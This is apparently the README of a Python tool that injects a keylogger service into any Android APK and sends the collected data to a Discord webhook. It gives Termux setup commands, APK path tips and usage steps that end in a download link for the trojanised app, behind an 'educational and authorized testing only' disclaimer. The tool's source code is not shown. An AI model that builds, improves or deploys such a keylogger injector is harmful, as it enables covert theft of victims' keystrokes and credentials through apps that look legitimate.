# 🔒 APK Keylogger Injector

> **⚠️ FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY**

## 📌 Overview

APK Keylogger Injector is a Python tool that injects a keylogger service into any Android APK. Runs locally in Termux/Linux.

---

## 🛠️ Installation Fixes (If Packages Don't Install)

### Problem: `unable to locate package apktool/openjdk`

**Solution:**
```bash
# 1. Update repos
pkg update -y && pkg upgrade -y
pkg install root-repo x11-repo -y
pkg update -y

# 2. Install packages
pkg install apktool zipalign aapt openjdk-17 -y
```

### If `apktool` Still Fails (Manual Install):
```bash
# Download and install manually
wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool
wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.9.3.jar
mv apktool $PREFIX/bin/
mv apktool_2.9.3.jar $PREFIX/bin/
chmod +x $PREFIX/bin/apktool
```

### If `openjdk-17` Fails:
```bash
pkg install openjdk-25 -y  # Newer version works
```

### Python Requests Install Fix:
```bash
python -m pip install --upgrade pip
rm -rf ~/.cache/pip
python -m pip install requests
```

---

## 📁 APK Path Format (Important)

**✅ Correct Ways:**
```
/sdcard/Download/myapp.apk
/storage/emulated/0/Download/app.apk
```

**❌ Wrong Ways (Auto-back Issue):**
```
/storage/emulated/0/Download/Free Fire.apk  # Space in name
"~/Download/app.apk"  # Quotes cause issues
```

**Fix Space in Filename:**
```bash
mv "/sdcard/Download/Free Fire.apk" "/sdcard/Download/FreeFire.apk"
```

**Check Available APKs:**
```bash
ls -la /sdcard/Download/*.apk
```

---

## 🚀 Usage

```bash
python injector.py
```

1. Select `[1] Inject Keylogger into APK`
2. Enter APK path (e.g., `/sdcard/Download/app.apk`)
3. Enter Discord Webhook URL
4. Select features to collect
5. Wait for injection to complete
6. Get download link!

---

## ⚠️ Legal Disclaimer

This tool is for educational and authorized testing only. Do not use on devices you don't own.

---

## 👨‍💻 Developer

**GT Security Team**
